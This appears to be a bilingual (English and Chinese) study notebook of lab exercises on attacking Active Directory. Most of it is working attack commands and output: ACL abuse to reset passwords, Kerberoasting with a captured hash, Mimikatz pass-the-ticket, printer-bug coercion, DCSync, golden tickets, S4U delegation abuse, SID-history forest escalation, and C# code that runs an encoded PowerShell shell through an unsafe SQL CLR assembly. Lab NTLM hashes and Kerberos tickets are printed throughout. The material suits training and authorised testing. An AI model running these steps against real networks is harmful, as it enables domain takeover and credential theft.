# Active Directory Exploitation
## Active Directory Object Permission
### Access Control Entries
these type can modify  that improperly configured DACLs can lead to
compromise of user accounts, domain groups, or even computers.
__AceType:__
__WD = WRITE_DAC__
__WO = WRITE_OWNER__
__GA = GENERIC_ALL__
這些權限代表物件可以被修改
### PowerView Enum Account Onbject type
#### Check single account 列舉帳號單一帳號物件屬性
```
. .\powerview.ps1
Get-ObjectAcl -Identity offsec
ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-553
PROD\RAS and IAS Servers 
可以知道SID的腳色
default AD domain group IAS RAS
# Internet Authentication Service (IAS)
# ## Remote Access Servers (RAS)
```
![[Pasted image 20210724134230.png]]
#### This enumeration produced a lot of output and required a manual SID conversion 
```
. .\powerview.ps1
Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-
Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID
$_.SecurityIdentifier.value) -Force; $_}

Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} |Select-String "Domain Admins"


```
@{__AceType=AccessAllowed__; ObjectDN=CN=Offsec,OU=prodUsers,DC=prod,DC=corp1,DC=com; __ActiveDirectoryRights=GenericAll__; OpaqueLength=0; ObjectSID=S-1-5-21-634106289-3621871093-708134407-1109; InheritanceFlags=None; BinaryLength=36;
IsInherited=False; IsCallback=False; PropagationFlags=None; SecurityIdentifier=S-1-5-21-634106289-3621871093-708134407-512; AccessMask=983551; AuditFlags=None; AceFlags=None; AceQualifier=AccessAllowed; __Identity=PROD\Domain Admins__}
__AceType:AccessAllowed__
__ActiveDirectoryRights : GenericAll__
__Identity : PROD\\Domain Admins__
#### Enumerate all ACEs for all domain users
```
. .\powerview.ps1

Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-
Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID
$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq
$("$env:UserDomain\$env:Username")) {$_}}
```

![[Pasted image 20210724142454.png]]
因為 TestService1 被委派的帳號是 Offsec ，又因Offsec 是 Domain Admin ，造成可以權限擴張，這種情況在常見的SharePoint 和 Exchange 見到 服務委派權限過大，進而直接修改 TestService1 的帳號密碼 因為有 GenericAll access 的識別

__AceType : AccessAllowed__
__ObjectDN : CN=TestService1,OU=prodUsers,DC=prod,DC=corp1,DC=com__
__ActiveDirectoryRights : GenericAll__
__Identity : PROD\\offsec__
`net user testservice1 h4x /domain`
#### enumerate all domain groups that our current user has  access rights
```
. .\powerview.ps1

Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-
Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID
$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq
$("$env:UserDomain\$env:Username")) {$_}}
```
__AceType : AccessAllowed__
__ObjectDN : CN=TestService1,OU=prodUsers,DC=prod,DC=corp1,DC=com__
__ActiveDirectoryRights : GenericAll__
__Identity : PROD\\offsec__
`net group testgroup offsec /add /domain`
#### 16.1.2.1 Exercises
`smbexec.py prod/testservice1:h4x@192.168.70.75`

## Abusing WriteDACL
### enumerate misconfigured user accounts
```
. .\powerview.ps1
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-
Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID
$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq
$("$env:UserDomain\$env:Username")) {$_}}
```
__AceType : AccessAllowed__
__ObjectDN : CN=TestService2,OU=prodUsers,DC=prod,DC=corp1,DC=com__
__ActiveDirectoryRights__ : ReadProperty, GenericExecute, __WriteDacl__
__Identity : PROD\\offsec__
#### add the GenericAll access right to the TestService2
`Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity
offsec -Rights All`
#### check modify the DACL
```
Get-ObjectAcl -Identity testservice2 -ResolveGUIDs | Foreach-Object {$_ |
Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID
$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq
$("$env:UserDomain\$env:Username")) {$_}}
```
__ActiveDirectoryRights : GenericAll__
#### 16.1.2.1 Exercises GenericAll
```
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.ActiveDirectoryRights -eq "GenericAll") {$_}}
```
```
net user testservice2 h4x /domain
smbexec.py prod/testservice1:h4x@192.168.70.75
```
#### 16.1.3.1 Exercises WriteDacl
```
PS C:\Tools\SysinternalsSuite> Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.ActiveDirectoryRights -ge "WriteDacl") {$_}}
```

```
Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
```

```
net user testservice2 h4x /domain
smbexec.py prod/testservice1:h4x@192.168.70.75
```
#### 16.1.3.2 Extra Mile
```
$victimuser = testservice3
Get-DomainUser $victimuser | Select serviceprincipalname
Set-DomainObject -Identity $victimuser -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
$User = Get-DomainUser $victimuser 
$User | Get-DomainSPNTicket | fl
$User | Select serviceprincipalname
Set-DomainObject -Identity victimuser -Clear serviceprincipalname

```
![[Pasted image 20210724203923.png]]
```
john --format:krb5tgs testservice3 --wordlist=/usr/share/wordlists/rockyou.txt
hashcat.exe -m 13100 -a 0 testhash.txt rockyou.txt

$krb5tgs$23$*TestService3$prod.corp1.com$nonexistent/BLAHBLAH*$57c9a15d26bcc68f753498ca32321340$660b23d03f8420cfc48ffa94a1b57069cfdfe689a8be13092b3853cdf2c5c83fc4b8e65b71f07ee737c9fbace8490413e3bb1a5df9bfc521a083e8faf40713b10730a00f6a9a1bb3d43a38bdde05054b4d79f98227105986ce01d9c64875360a8edca0783a90ea1f85f98fdca4304003e0c08a33e563fab8f87dd112be15c8b62c20206b5f19edb223d9e88e3517bbfc783fdb76cf359a2662ea4525dae133b7cde15dcd93a62ea7d59bc85fee3d594a501760ad16cb0634aa604ef8de04defbfbd8e18dd1a5de998e0edddf143eff51731d30696b18801e90fd5a25ff46b984bd09e9ef202b89373f5a368b0e92a9a9b5b63754ce91efa424edb8cd1aeac4281d7e303f2b469894e576ee6c5b761af494ed925019536fb82ad3d0bf0aedaff68e134ee236afd3067d9f0bbce20d34d4a3dba80f31ee7668689c5166479894b71d8fd76b13bb429c85ef3509b74f42820d01a2207c6e807609248574a0bbe729a4e074ba852fc9cb9599bb01f96c912456ae86f462c4cd6f6d8c366d02af288e4a7d51a305db6e9e19f5dbf8fcec03120888973a953a28d3eb86e8324bab763349c54b65f357db34171114759b581c955064580bd21df2e61202c92dddf38192bb1fff0a97031aca5ded06e815d45f4826f4f0bc5b1a8317d5c24fb1d31e9f7f3936470e9335f959aa391f917bc5084c4319a395a90744ff1ed7fbd32051370de1026682d841123365664f0197540086f21d4e2801400278614b7fa22df699cb182b329aeb2e2b345b5787b60850563d930a2d0d2a799ef346f50b74fac6f6e98aa4232fac89a5abdb8d59dba85aee7e83341d930f2201a3ed194b351e58a2ea0e2953ae91420a7169ca0b3d87e2b63d46c29b8817d44d4c041ed29c8dbc66fd5918ec46bee32e253db427411f3898326f79a42815738dcb018e5740cafaef8e34f71c8bffe91d386ac8a2202f9c660a5ff43d791254158099c533c2fdf8bcaf30698d689a59719bdde18a4cd9dca236ef1b2ed99569a896ce00a5c899c7726371ac4f5068d3e4c78333263463f1d972bacff81d884f8a2827f2e3c1b61f483b5b42e9dad1ff1468b314b1408a7a22be026fc1162b2bf9c85d55bdd0eeafdba484b3bad96536773840d106885d7f4a472223e2299826c34fcf66d48e77ad67dc3ece5967e8639083e83f2fb10edc6ee18369a08be575249652e380d77e04fac88215b78a592d40756fb08d939c9c2230bd21a310f1482877d1459f622f5c2f6ecd2a3b5c42e19a9745aa891c6c1b874fa76b0d1a76892804f9ca55afe373c645e566df708ed007c18a2dec16eb3dd99dc2526faa8d0c14499ea4d7fd022204529a9a59357c946b12e72987d247eb0038100592422c5433064239348bd0ab146c1d538e4b5713b503327491022d5afa0f69442cd6a9c9f18396228942f43f8675bde5f9aabeaf63:lab
```
## Unconstrained Delegation 非約束委派
**在託管 TGS-REQ 中引用的服務主體名稱（SPN） 中指定的服務的伺服器上啟用 Kerberos 非約束委派時，DC 將使用者的 TGT 副本放入服務票據中。 當使用者的服務票據（TGS 票據）提供給伺服器來訪問服務時，伺服器將打開 TGS 票據，將使用者的 TGT 放入本地安全認證子系統服務 LSASS，以供以後使用，此時應用伺服器可以無限制地模擬使用者身份**
### Get  Unconstrained
```
Get-DomainComputer -Unconstrained
```
__useraccountcontrol : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION__
__cn: APPSRV01___
### in Unconstrained Machine(APPSRV01) Execute Mimikatz with administrator
當 APPSRV01 是被指定成非約束委派的機器時，只要有使用者登入或是網域管理者登入，既可以在APPSRV01 Dump 出登入的使用者的credentials 進而偽造使用者登入或是登入網域控制站
#### 16.2.1.1 Exercise
```
使用者登入 APPSRV01

privilege::debug
sekurlsa::tickets /export
kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi
exit #注意這是當下的CMD以被注入票券所以要用當前CMD

C:\Tools\SysinternalsSuite\PsExec.exe \\cdc01 cmd
```
### 非約束委派-黃金票券欺騙-網域控制器印表機服務
```
dir \\cdc01\pipe\spoolss
dir \\dc01\pipe\spoolss

A:Rubeus.exe monitor /interval:5 /filteruser:CDC01$
B:SpoolSample.exe CDC01 APPSRV01

 User                  :  CDC01$@PROD.CORP1.COM
 StartTime             :  7/24/2021 12:49:42 AM
 EndTime               :  7/24/2021 10:49:29 AM
 RenewTill             :  7/31/2021 12:49:29 AM
 Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
 Base64EncodedTicket   : doIFIjCCBR6gAwIBBaEDAgEWooIEIzCCBB9hggQbMIIEF6ADAgEFoRAbDlBST0QuQ09SUDEuQ09NoiMwIaADAgECoRowGBsGa3JidGd0Gw5QUk9ELkNPUlAxLkNPTaOCA9cwggPToAMCARKhAwIBAqKCA8UEggPByrPTlPvVt1XZIgnGc7nQCBmrLTcxIGiBXLUw5WzzuukiaJQurPhXjNN7Hda4T6p95q0RN0Jdy/ukYH96Ii0OCtMKBD54V8TfjdjLU0KRRVNbtAISyygiK+X0dTFNcoIUX2qpaBBQ5TKgbG6LDKE5cUDZZ544CuKlvTMBSzdg3mPa8gKsQZRhzKwcqcRMyCxIr8niT60jzHlPLrBEj/18OdRXR18lD39R2vBM/pppOGledEbh7+IeO1lHrbdLtHV1A0hW/ikDld01puAF0TN6dAwSByim4Zf1IOoqf3kQRZCnLfiY5MtyMpBWFW6gyt++B5iyADjYEKM7icTvXNE12IXBPaClmm+e1DOj28upB/0Skk9wVDr2Bjms0tTD+97L3SkJijPs7zx9NpWCpUywu5FtNDLbQBRsuD2rykHnGN+X/qSrEww2AuvPE6VAC2kq+CGMpLEsM+m2Hnxb9jqF5PJECSnIRI53lRflqcwhgyfuOwVmSMAOY6NVeNGHKd1vKz5+RsNt15Qo3ShgRtuPewZsaIeJTD2Tay5PgCZUIzdYbh17gBG9TnezJ4eXVZln1jli1XIpgASmSU5v2Vw9pTNCWCDghuP+eEEFwXOF4r7lvGXXU0ek3vYI+xmiwxT0Qi9n9ReE441aHt5RMVZpw/2BKGx2B2V8YOuT6GYTf8dnWUZO6fnAOx3+vIlj3KjkLRZssy5R12tSUwdbs5AxDOikeo9V1fjKS3IOC+FOtAxAU7lXSQZbRAerrUeuPFMD351XTeG6b2msTIrG55Ugz1Zv5M9xOySMI5kPrgLGRgJxTANjYIoZeCvXrIQ6VONgYJuz3KRO8RVvLrpearbkzHde/b/J25Vm9STWlkuvudByzr8TnitBdqZAT/A9B+NNDyxfOxzxRIoMa2RYB+oR9NOwlXWj43pZKBhWrGt4xoYosRwkMsx+gjHVYN9DS+RHGtfFfOtINH77qPW38MlDocL0p4x/FtlaPMAlsDmH/iiwKmMpoZbMJwMLf9dFKADem9p27cs0rQAQExB+WuG1SF2xJKtmcPiUCs0od6eUkg/1eFxPHccI98QTOPWSQaxwnzsfS/FOOF22kpnO4TAtCmgzvjyIVCHcxJoUJrLoGVfilIJIzccWjETHvOFOhmuCSF0VJ31eVCicgOOVRxa4e7yr0I55A/7iSyQjRL7vkDetPf693ABEgtdTCsPWYeyrQRbdqRFXWG9VCQiHfGNV4S/A1mOo4Udr6wFd/tAhV25IeWd9e9gtZa/YycZKjz2GYaOB6jCB56ADAgEAooHfBIHcfYHZMIHWoIHTMIHQMIHNoCswKaADAgESoSIEIBTKKNDLywEd9u4wWLcmjeTE8KFz5eef+32wwApSkT8koRAbDlBST0QuQ09SUDEuQ09NohMwEaADAgEBoQowCBsGQ0RDMDEkowcDBQBgoQAApREYDzIwMjEwNzI0MDc0OTQyWqYRGA8yMDIxMDcyNDE3NDkyOVqnERgPMjAyMTA3MzEwNzQ5MjlaqBAbDlBST0QuQ09SUDEuQ09NqSMwIaADAgECoRowGBsGa3JidGd0Gw5QUk9ELkNPUlAxLkNPTQ==

```
#### 導入DC票券
```
RubeusRubeus.exe.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo....=
```
#### 非約束委派 使用 DC票券 獲取 administrator hash 或是直接獲取krbtgt
#### 16.2.2.1 Exercises
```
kerberos::golden /user:[fackyser] /domain:prod.corp1.com /sid:[domain-sid] /krbtgt:[krbtgt hash] /ptt
```
`mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:prod\administrator`
`Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e`
`evil-winrm  -i 192.168.70.70 -u administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e`
## Constrained Delegation 約束委派
由於非約束委派的不安全性（配置了非約束委派的機器在 LSASS 中緩存了使用者的 TGT 票據可類比使用者去訪問域中任意服務），微軟在 Windows Server 2003 中引入了約束委派，對 Kerberos 協議進行拓展，引入了 （S4U2Self / S4U2proxy）， 運行服務代表使用者向 KDC 請求票據。`S4U`

-   `S4U2self`（Service for User to S4U2Self） 可以代表自身請求針對其自身的 Kerberos 服務票據（ST）;如果一個**服務帳戶**的 userAccountControl 標誌為 ， 則其可以**代表任何其他使用者**獲取自身服務的 TGS/ST。`TRUSTED_TO_AUTH_FOR_DELEGATION`
    
-   `S4U2proxy`（Service for User to Proxy） 可以以使用者的名義請求其它服務的 ST，限制了 S4U2proxy 擴展的範圍。 服務帳戶可以**代表任何使用者**獲取在 中設置的服務的 TGS/ST，首先需要從該使用者到其本身的 TGS/ST，但它可以在請求另一個 TGS 之前使用 S4U2self 獲得此 TGS/ST。`msDS-AllowedToDelegateTo`
-   
**如果我們可以攻破配置約束委派的服務帳戶（獲取密碼/Hash），我們就可以類比域內任意使用者（如 domain\\administrator） 並代表其獲得對已配置服務的訪問許可權（獲取 TGS 票據）。**
```
PS C:\Tools> Get-DomainUser -TrustedToAuth

logoncount               : 4
badpasswordtime          : 12/31/1600 4:00:00 PM
distinguishedname        : CN=IISSvc,OU=prodUsers,DC=prod,DC=corp1,DC=com
objectclass              : {top, person, organizationalPerson, user}
displayname              : IISSvc
lastlogontimestamp       : 8/18/2020 5:48:45 AM
userprincipalname        : IISSvc@prod.corp1.com
name                     : IISSvc
objectsid                : S-1-5-21-634106289-3621871093-708134407-1115
samaccountname           : IISSvc
codepage                 : 0
samaccounttype           : USER_OBJECT
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 9/18/2020 7:38:28 PM
instancetype             : 4
usncreated               : 16603
objectguid               : a22b64d8-6fb5-4f67-8f8c-4259a6966672
lastlogoff               : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto : {MSSQLSvc/cdc01.prod.corp1.com:1433, MSSQLSvc/cdc01.prod.corp1.com:SQLEXPRESS}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=corp1,DC=com
dscorepropagationdata    : 1/1/1601 12:00:00 AM
serviceprincipalname     : {HTTP/web.prod.corp1.com, HTTP/web}
givenname                : IISSvc
lastlogon                : 8/18/2020 1:01:20 PM
badpwdcount              : 0
cn                       : IISSvc
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
whencreated              : 4/20/2020 12:03:47 PM
primarygroupid           : 513
pwdlastset               : 4/20/2020 5:03:47 AM
usnchanged               : 32853
```
### 16.2.3.1 Exercises
第一步產生 已知的 委派帳號iisvc 的密碼轉換成NTLM
` .\Rubeus.exe hash /password:lab`
第二步 產生 iisvc 的TGT
`.\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E`
第三步 使用產生的TGT 來模擬連向 委派帳號的administrator 權限(administator 委派給 mssqlsvc)，並注入記憶體
```
.\Rubeus.exe s4u /ticket:doIE+jCCBPagAwIBBaEDAgEWooIECzCCBAdhggQDMIID/6ADAgEFoRAbDlBST0QuQ09SUDEuQ09NoiMwIaADAgECoRowGBsGa3JidGd0Gw5wcm9kLmNvcnAxLmNvbaOCA78wggO7oAMCARKhAwIBAqKCA60EggOpkZuyBiQ0I5XEcW7RrN2KPlUK1UZU8V4J5N6zr0V
MnfKQ9uPI2B8EJ8h+5xpjRrmR3DY6suM/PRYHpraaFzjt6DpWmXfKxFgkt33RDBWqImNOO04lQEZUO51vJjAlmUt99uc48RgRddO+Vo1cLxrcqwCzEogkox/SrAuGFsUhl7Mb/Ikxey8AEb8wQ5OhIdEro5yPMyaPT/8liTzg6DxQ/hozp2asEeUuj15VfxRS2HTyIOVXFIzjSXtszr/lP2zTO+TZBZ+iwVokQxLovzrY
reWguF0lt2sDORlTNPReUX6lpdZ7jficrjQs7tzJp3qdHUHc1HxmYOqP9UIJD8Vo1vhuStgHEmzBEUHZmsmZCiGbie40rkd+kx6QRoZ5uAZHMi8Nom9v8UAnIPzK7fI9GoExL1x8Z5a3rdEd5YX18SshEzgHS6fPFptedh5+CrGJhawaOX9W6d6mVlEBjrD7XEXu9I4fRvhPrHs/nfb3sZzi5ZR9J1QIURSKeUFepYaWQ
o2CIFgmVqozJ1v/ss0PljpCYbq+CyfH+4fbX6ZXFRuU4D+7shJAPnne+su8rMnWM5RJfxwafP53wxA5oxeTgmc1EI2ppDzo77kuAEwSDbZHAyUry0TZrc85V3SnuF2lMcugMeDWpIHk0AtGNGemQBl3wYEwgRQ7Gewb5AnHZn2DSpD81ZTICxna8+0sNsM15eq4AnRLhC0Yao7i9cSIPeZJvmzqEGuxIAvUT9kjkd3Tup
74RUNMYyHK15iCIstBeDMhNrYrFNkVDFvCUwYeSg8w2x0O0eDpuc11CoDiJd2IO7MK8JZv1+CXfHGV0t/h1HejNVjMx9zev6bDPwJZq8BS0HwZWrV6LeXM7HLoXxevEH4AvuEVT8ANGU6mGhe4ydNGgraAoLDgbY36FBLMgHRKUXp9XKuMUhWCxeH/ZDFaBSrvmrW4duIt0LWh4s7kZBzu5BPsKb6NjtofJUUEyFNxQHD
w61tc2kEju5AZ0W38vAo5r2m+Ru0n63m4ROROKBM6a3dFKxB9xUEl02KsKSYqAajmsHsv6rKAgCQkaD4q7wL2+NCRhTTg/NXixrn003F+loW+WbhOVY68k07IMO/VMEDIc2UVFGLLKKG9DloxWnRz9g2lWOe8SHHcuNJeGZsmPdqeluky4J+fsoQ5Ozqb00E/KcIhooFETgNAcXC8GsHrB5fVqf5ShdsXgFtmlgC97cbm
UxUBon4MYRuVYeQP7hPQ26ObpqOB2jCB16ADAgEAooHPBIHMfYHJMIHGoIHDMIHAMIG9oBswGaADAgEXoRIEEMQyBm0cemRHNWvpH6qLrTahEBsOUFJPRC5DT1JQMS5DT02iEzARoAMCAQGhCjAIGwZpaXNzdmOjBwMFAEDhAAClERgPMjAyMTA3MjUwNDUyNDlaphEYDzIwMjEwNzI1MTQ1MjQ5WqcRGA8yMDIxMDgwM
TA0NTI0OVqoEBsOUFJPRC5DT1JQMS5DT02pIzAhoAMCAQKhGjAYGwZrcmJ0Z3QbDnByb2QuY29ycDEuY29t /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
```
第四步 確認權限為模擬的adminsitrator
`./SQL.exe`
第五步 使用第15章的方式 開啟 自訂 cmd 用當前委派權限執行powershell 彈shell
```
using System;
using System.Data.SqlClient;

namespace SqlConnect
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "cdc01.prod.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_options = @"use msdb;EXEC sp_configure 'show advanced options', 1;RECONFIGURE; EXEC sp_configure 'clr enabled',1;RECONFIGURE;EXEC sp_configure 'clr strict security', 0;RECONFIGURE;";
            String DLL_HEX = ".........";
            String creatAsm = "CREATE ASSEMBLY myAssembly FROM " +
                              DLL_HEX 
                              + " WITH PERMISSION_SET = UNSAFE;";
            String creatPro = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
            String exeCmd = "Exec cmdExec 'powershell -enc ......'";

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            try
            {
                SqlCommand command = new SqlCommand(impersonateUser, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(enable_options, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(creatAsm, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(creatPro, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(exeCmd, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Result of command is: " + reader[0]);
                reader.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            con.Close();
        }
    }
}

```
## Resource-Based Constrained Delegation 資源約束委派
Windows Server 2012中新加入了基於kerberos資源的約束委派（rbcd），與傳統的約束委派相比  ，它不再需要域管理員對其進行配置，可以直接在機器帳戶上配置
msDS-AllowedToActOnBehalfOfOtherIdentity屬性來設置基於資源的約束委派。 此屬性的作用是控制哪些使用者可以類比成域內任意使用者，然後向該電腦進行身份驗證。 簡而言之： 如果我們可以修改該屬性那麼我們就能拿到一張域管理員的票據，**但該票據只對這台機器（appsrv01）生效，然後拿這張票據去對這台機器（appsrv01）進行認證。**

### 16.2.4.1 Exercises
假設攻擊者已經在當下使用者(dave)的受害電腦上擁有等同於電腦帳戶的寫入許可權
(Genericwrite GenericAll, WriteProperty, or WriteDACL)：
```
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ |Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
---------------
AceType               : AccessAllowed
ObjectDN              : CN=APPSRV01,OU=prodComputers,DC=prod,DC=corp1,DC=com
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
OpaqueLength          : 0
ObjectSID             : S-1-5-21-634106289-3621871093-708134407-1111
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-634106289-3621871093-708134407-1110
AccessMask            : 131132
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed
Identity              : PROD\dave
```

 ```
 Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota
 -------------------------
 ms-ds-machineaccountquota
-------------------------
                       10
 ```
 
 .\\powermad.ps1 可以新增電腦和電腦的密碼
 ```
 New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force
 
 Get-DomainComputer -Identity myComputer
 取得SID
 ```
 設定新增電腦的屬性
 ```
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid |Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)
Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$
SDBytes}
 ```
 取得 appsrv01 電腦 msds-allowedtoactonbehalfofotheridentity 屬性值
 ```
 $RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity'| select -expand msds-allowedtoactonbehalfofotheridentity
 
 $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -
ArgumentList $RBCDbytes, 0

 $Descriptor.DiscretionaryAcl
 ```
 確認 SID 電腦存在
 ```
 ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-2101
 ```
 產生新增腦時的密碼
 ```
 .\Rubeus.exe hash /password:h4x
```
注入可以登入 appsrv01 的票券
```
.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221
/impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt
-------------------------------
dir \\appsrv01.prod.corp1.com\c$
```
## Enumeration in the Forest 樹系枚舉
### 16.3.2.1 Exercises
信任枚舉
`Get-DomainTrust -API`
網域使用者枚舉
`Get-DomainUser -Domain corp1.com`
網域管理者枚舉
`Get-DomainGroupMember "Domain Admins"`
### Burning Down the Forest
### 16.4.1.2 Extra Mile
Domain A 若信任 Domain B 則 Domain A也會信任 Domain B 的電腦名稱(corp1$)
可以利用這一點，在Domain B 所屬的主機上使用 Domain admins 群組的帳號密碼
來獲取krbtgt 的黃金票券
1.`lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt`
2.獲得票券後獲取Domain A 和 Domain B的 SID
```
Get-DomainSID -Domain prod.corp1.com
Get-DomainSid -Domain corp1.com
```
3.使用Domain B 金票券模擬 Domain A的Enterprise Admin 注入記憶體
```
kerberos::golden /user:h4x /domain:prod.corp1.com /sid:[Domain B SID] /krbtgt: cce9d6cd94eb31ccfbb7cc8eeadf7ce1 /sids:[Domain A Enterprise Admins 519] /ptt
```
4.當下的程式就可以登入 Domain A的 網域控制器

### 16.4.2 Owning the Forest with Printers 透過主網域控制器印表機獲取票券
#### 16.4.2.1 Exercises
第一步 嘗試獲取主網域控制器印表機服務

```
ls \\rdc01\pipe\spoolss
ls \\dc01\pipe\spoolss
```

第二步監聽 票券觸發票券(admin)
```
Rubeus.exe monitor /interval:5 /filteruser:RDC01$
.\SpoolSample.exe rdc01.corp1.com appsrv01.prod.corp1.com
```
第三步獲取票券後注入記憶體
```
Rubeus.exe ptt /ticket:doIE9DCCBPCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID
```
第四步強制獲取 主網域控制器 administrator 票券
```
lsadump::dcsync /domain:corp1.com /user:corp1\administrator
```
第五步 利用NTLM 燈 入主網域控制器
`evil-winrm  -i 192.168.70.60 -u administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e`
## Going Beyond the Forest 找出其他關連樹系使用者
#### 16.5.2.1 Exercises
```
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()

Get-DomainTrustMapping

Get-DomainUser -Domain corp2.com

Get-DomainForeignGroupMember -Domain corp2.com
```
找出信任樹系中關聯的使用者
**Get-DomainForeignGroupMember -Domain corp2.com**
PROD\\dave
####  16.6.1 信任樹系的權限維持
當前域與其他域有信任關係，例如當前域與domain1.com和domian2.com存在雙向信任
16.6.1.1 Exercises
開啟SID History，與其中任意一個開啟SID History信任，即可使用下面的方法
第一步在 corp2.com 開啟 Administrator comand 把corp1.com 加入
`netdom trust corp2.com /d:corp1.com /enablesidhistory:yes`

第二步 use domain admin dcsync
`lsadump::dcsync /domain:corp1.com /user:corp1\krbtgt`
第三步取得Domain SID
```
Get-DomainSID -domain corp1.com
S-1-5-21-1095350385-1831131555-2412080359
Get-DomainSID -domain corp2.com
S-1-5-21-4182647938-3943167060-1815963754

Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com
```
第四步 注入票券
```
kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1095350385-
1831131555-2412080359 /krbtgt:22722f2e5074c2f03938f6ba2de5ae5c /sids:S-1-5-21-
4182647938-3943167060-1815963754-1106 /ptt
```
第五步取得權限
`c:\tools\SysinternalsSuite\PsExec.exe \\dc01.corp2.com cmd`
### Linked SQL Servers in the Forest
登入 cdc01.corp1 -> rdc01.corp1 -> dc01.corp2
```
EXEC ( ' EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT "dc01.corp2.com" ') AT "rdc01.corp1.com";

EXEC ( ' EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT "dc01.corp2.com" ') AT "rdc01.corp1.com";

